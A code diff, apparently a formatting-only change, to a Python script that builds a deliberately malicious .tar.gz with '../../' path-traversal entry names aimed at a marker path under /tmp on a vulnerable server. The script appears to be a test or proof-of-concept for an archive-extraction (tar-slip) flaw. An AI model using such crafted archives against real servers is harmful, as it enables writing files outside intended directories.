@@ -42,7 +42,7 @@ import time
 
 def build_archive(mode: str, output: str, marker: str) -> None:
     if mode == "relative":
-        entry_name = "../../" + marker[len("/tmp/"):]
+        entry_name = "../../" + marker[len("/tmp/") :]
     else:
         entry_name = marker
 
@@ -65,11 +65,15 @@ def build_archive(mode: str, output: str, marker: str) -> None:
 def main() -> int:
     ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
     ap.add_argument("--mode", required=True, choices=["relative", "absolute"])
-    ap.add_argument("--output", required=True,
-                    help="path to write the malicious .tar.gz")
-    ap.add_argument("--marker", required=True,
-                    help="absolute path under /tmp/ where the traversal "
-                         "would land on a vulnerable server")
+    ap.add_argument(
+        "--output", required=True, help="path to write the malicious .tar.gz"
+    )
+    ap.add_argument(
+        "--marker",
+        required=True,
+        help="absolute path under /tmp/ where the traversal "
+        "would land on a vulnerable server",
+    )
     args = ap.parse_args()
 
     try:
